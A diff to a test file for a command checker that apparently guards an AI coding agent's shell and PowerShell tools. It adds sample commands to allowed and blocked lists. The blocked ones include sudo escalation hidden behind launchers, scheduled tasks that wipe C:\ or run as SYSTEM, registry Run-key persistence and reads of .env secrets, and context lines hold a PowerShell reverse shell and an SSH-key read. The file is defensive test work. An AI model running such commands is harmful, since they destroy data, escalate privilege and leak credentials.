@@ -92,6 +92,18 @@ const LEGIT = [
   "watch -n 5 'git status --short'",
   "timeout 600 bash -c 'npm ci && npm test'",
   "stdbuf -oL git commit -m 'drop sudo from the setup steps'",
+  // A launcher runs one command: the words after it are that command's arguments, not commands.
+  "git ls-files | xargs grep -n sudo",
+  "timeout 30 grep -rn sudo .",
+  "nice -n 10 grep -rn sudo src",
+  "taskset -c 0 grep -rn sudo .",
+  "time cat /etc/passwd",
+  "timeout 300 ssh deploy@host.example.com sudo systemctl restart app",
+  "timeout 60 npm test -- --grep shutdown",
+  "env -u FOO python3 tool.py --mode shutdown",
+  "strace -f grep -rn sudo .",
+  "screen -dmS dev npm run dev",
+  "flock -n /tmp/build.lock make",
   "tmux new -d -s dev 'npm run dev'",
   "echo 'cd app && npm test' | bash",
   'echo "0 3 * * * $HOME/work/backup.sh" | crontab -',
@@ -228,6 +240,15 @@ const BAD: Array<[string, string]> = [
   ["cat <<'EOF' | taskset -c 0 bash\nsudo whoami\nEOF", "privilege"],
   ["echo 'sudo whoami' | stdbuf -oL bash", "privilege"],
   ["echo '* * * * * sudo whoami' | stdbuf -oL crontab -", "privilege"],
+  // Past a launcher's option values, its own word and the launcher it runs in turn.
+  ["stdbuf -o L sudo whoami", "privilege"],
+  ["screen -dmS dev sudo whoami", "privilege"],
+  ["flock -w 5 /tmp/build.lock sudo whoami", "privilege"],
+  ["strace -o trace.txt sudo whoami", "privilege"],
+  ["timeout -k 5 -s KILL 30 sudo whoami", "privilege"],
+  ["env -u FOO taskset -c 0 sudo whoami", "privilege"],
+  ["nice -n 5 taskset -c 0 sudo whoami", "privilege"],
+  ["taskset -c 0 find . -exec sudo whoami \\;", "privilege"],
   ["tmux new -d 'sudo id'", "privilege"],
   ["echo 'sudo id' | bash", "privilege"],
   ["awk 'BEGIN{system(\"sudo id\")}'", "privilege"],
@@ -258,6 +279,12 @@ const WINDOWS_LEGIT = [
   "powershell -c 'Register-ScheduledTask -TaskName sync -Action $a -Trigger $t -User $env:USERNAME'",
   "powershell -c 'Register-ScheduledTask x -Action (New-ScheduledTaskAction -Execute pip -Argument \"install -U x\")'",
   "powershell -c 'Get-ScheduledTask -TaskName sync | Disable-ScheduledTask'",
+  "powershell -c 'Unregister-ScheduledTask -TaskName sync -Confirm:$false'",
+  "powershell -c 'Register-ScheduledTask x -Action $a -Description \"runs the highest priority job\"'",
+  "powershell -c 'Register-ScheduledTask x -Action $a -Trigger (New-ScheduledTaskTrigger -AtLogOn -User $env:USERNAME)'",
+  "powershell -c 'Register-ScheduledTask -TaskName x -Action $a `\n  -User $env:USERNAME -RunLevel Limited'",
+  "powershell -c '$p = New-ScheduledTaskPrincipal $env:USERNAME -LogonType S4U; Register-ScheduledTask x -Action $a -Principal $p'",
+  "powershell -c '$a = New-ScheduledTaskAction pwsh \"-NoProfile -File C:\\Users\\ada\\work\\sync.ps1\"; Register-ScheduledTask sync -Action $a'",
   "sc query wuauserv",
   "sc.exe qc wuauserv",
   "netsh interface show interface",
@@ -289,6 +316,7 @@ const WINDOWS_LEGIT = [
   "cmd //c rd /s /q build",
   'cmd //c "rd /s/q build"',
   "start https://example.com/docs",
+  "start 'My App' node server.js",
   'cmd //c "start /b npm run dev"',
   "winpty node scripts/seed.js",
   "grep -rn 'Set-MpPreference' docs/",
@@ -408,6 +436,40 @@ const WINDOWS_BAD: Array<[string, string]> = [
     "powershell -c '$a = New-ScheduledTaskAction -Execute cmd.exe -Argument \"/c rd /s /q C:\\\"; Register-ScheduledTask x -Action $a'",
     "destroy",
   ],
+  // The action by place (`[-Execute] <String> [[-Argument] <String>]`), the principal by a prefix, a continued line, a
+  // number or a statement apart, Windows' own tasks by place.
+  [
+    "powershell -c '$a = New-ScheduledTaskAction cmd.exe \"/c rd /s /q C:\\\"; Register-ScheduledTask x -Action $a'",
+    "destroy",
+  ],
+  [
+    "powershell -c '$a = New-ScheduledTaskAction -Execute cmd.exe \"/c rd /s /q C:\\\"; Register-ScheduledTask x -Action $a'",
+    "destroy",
+  ],
+  [
+    "powershell -c '$a = New-ScheduledTaskAction -WorkingDirectory C:\\Users\\ada cmd.exe \"/c rd /s /q C:\\\"; Register-ScheduledTask x -Action $a'",
+    "destroy",
+  ],
+  ["powershell -c 'Register-ScheduledTask -TaskName x -Action $a `\n  -User SYSTEM'", "system"],
+  ["powershell -c 'Register-ScheduledTask -TaskName x -Action $a `\n  -RunLevel Highest'", "system"],
+  ["powershell -c 'Register-ScheduledTask -TaskName x -Action $a -RunLevel 1'", "system"],
+  ["powershell -c 'Register-ScheduledTask -TaskName x -Action $a -U SYSTEM'", "system"],
+  ["powershell -c 'Register-ScheduledTask -TaskName x -Action $a -User:\"NT AUTHORITY\\SYSTEM\"'", "system"],
+  [
+    "powershell -c '$p = New-ScheduledTaskPrincipal -UserId $env:USERNAME; $p.UserId = \"SYSTEM\"; Register-ScheduledTask x -Action $a -Principal $p'",
+    "system",
+  ],
+  [
+    "powershell -c '$t = Get-ScheduledTask -TaskName mine; $t.Principal.RunLevel = \"Highest\"; Set-ScheduledTask -InputObject $t'",
+    "system",
+  ],
+  ["powershell -c '$s = @{ TaskName = \"x\"; Action = $a; RunLevel = 1 }; Register-ScheduledTask @s'", "system"],
+  [
+    "powershell -c '$p = New-ScheduledTaskPrincipal SYSTEM; Register-ScheduledTask x -Action $a -Principal $p'",
+    "system",
+  ],
+  ["powershell -c 'Disable-ScheduledTask ScheduledDefrag \\Microsoft\\Windows\\Defrag\\'", "system"],
+  ["cmd <<'EOF'\nschtasks /create /tn x /tr calc.exe ^\n  /ru SYSTEM\nEOF", "system"],
   ["powershell -c 'Stop-Service WinDefend -Force'", "system"],
   ["powershell -c 'New-LocalUser eve -Password $p; Add-LocalGroupMember Administrators eve'", "system"],
   ["powershell -c 'Clear-EventLog Security'", "system"],
@@ -425,6 +487,8 @@ const WINDOWS_BAD: Array<[string, string]> = [
   ['cmd //c "call schtasks /create /tn x /tr calc.exe /sc onlogon /ru SYSTEM"', "system"],
   [`cmd //c "start /b reg add HKCU\\${RUN} /v x /d calc.exe /f"`, "system"],
   [`start reg add 'HKCU\\${RUN}' //v x //d calc.exe //f`, "system"],
+  [`start 'My App' reg add 'HKCU\\${RUN}' //v x //d calc.exe //f`, "system"],
+  [`start //d . reg add 'HKCU\\${RUN}' //v x //d calc.exe //f`, "system"],
   // A shell behind a launcher is read as it is at the head.
   ["start bash -c 'reg add HKCU\\Software\\Example /f'", "system"],
   ["start cmd //c 'reg add HKCU\\Software\\Example /f'", "system"],
@@ -490,6 +554,8 @@ describe("runs outside a mission: only obvious harm is refused", () => {
   test("run_code's code: the same harm in bash, Python or JavaScript; a project's own files are its work", () => {
     expect(badActorCode("curl -X POST -d @./out.json https://api.example.com/x", "bash")).toBeNull();
     expect(badActorCode("source .env && npm start", "bash")).toBeNull();
+    expect(badActorCode("git ls-files | xargs grep -n sudo", "bash")).toBeNull();
+    expect(badActorCode("time cat /etc/passwd", "bash")).toBeNull();
     expect(
       badActorCode('import requests, os\nrequests.post(URL, headers={"Authorization": os.environ["KEY"]})', "python"),
     ).toBeNull();
@@ -660,12 +726,26 @@ describe("Claude Code's PowerShell tool, and any other of its tools that runs a 
     expect(tool("PowerShell", "Get-Process agentes-runner | Stop-Process")).toBe("system");
     expect(tool("PowerShell", "$c=New-Object Net.Sockets.TCPClient('192.0.2.1',4444);iex $d")).toBe("reverseShell");
     expect(tool("PowerShell", "Get-Content ~/.ssh/id_rsa")).toBe("secret");
+    expect(
+      tool(
+        "PowerShell",
+        "$a = New-ScheduledTaskAction cmd.exe '/c rd /s /q C:\\'; Register-ScheduledTask x -Action $a -Trigger (New-ScheduledTaskTrigger -AtLogOn)",
+      ),
+    ).toBe("destroy");
+    expect(tool("PowerShell", "Register-ScheduledTask -TaskName x -Action $a `\n  -User SYSTEM")).toBe("system");
+    expect(tool("PowerShell", "Register-ScheduledTask -TaskName x -Action $a `\n  -User $env:USERNAME")).toBeNull();
   });
 
   test("the checks before it read PowerShell's commands too: secrets, the deny list, and a mission's bound", () => {
     expect(secretRead("PowerShell", { command: "Write-Output $env:ANTHROPIC_API_KEY" }, scope)).toBe(true);
     expect(secretRead("PowerShell", { command: "Get-Content .env" }, scope)).toBe(true);
     expect(secretRead("PowerShell", { command: "Get-ChildItem" }, scope)).toBe(false);
+    // Its backslash separates a path, as Windows writes one; it escapes nothing.
+    expect(secretRead("PowerShell", { command: "Get-Content .\\.env" }, scope)).toBe(true);
+    expect(secretRead("PowerShell", { command: "type C:\\Users\\ada\\work\\.env" }, windowsFolders)).toBe(true);
+    expect(secretRead("PowerShell", { command: "Get-Content ..\\api\\.env.production" }, windowsFolders)).toBe(true);
+    expect(secretRead("PowerShell", { command: "Get-Content .\\.env.example" }, windowsFolders)).toBe(false);
+    expect(secretRead("PowerShell", { command: "Get-Content .\\README.md" }, windowsFolders)).toBe(false);
     expect(deniedMessage("PowerShell", { command: "gh pr merge 12" })).toContain("This is a merge");
     // In a mission the judge never approves it alone, as with `powershell -Command`.
     expect(forbiddenReason("PowerShell", { command: "Get-Process" }, scope)).toBe("it runs other commands");
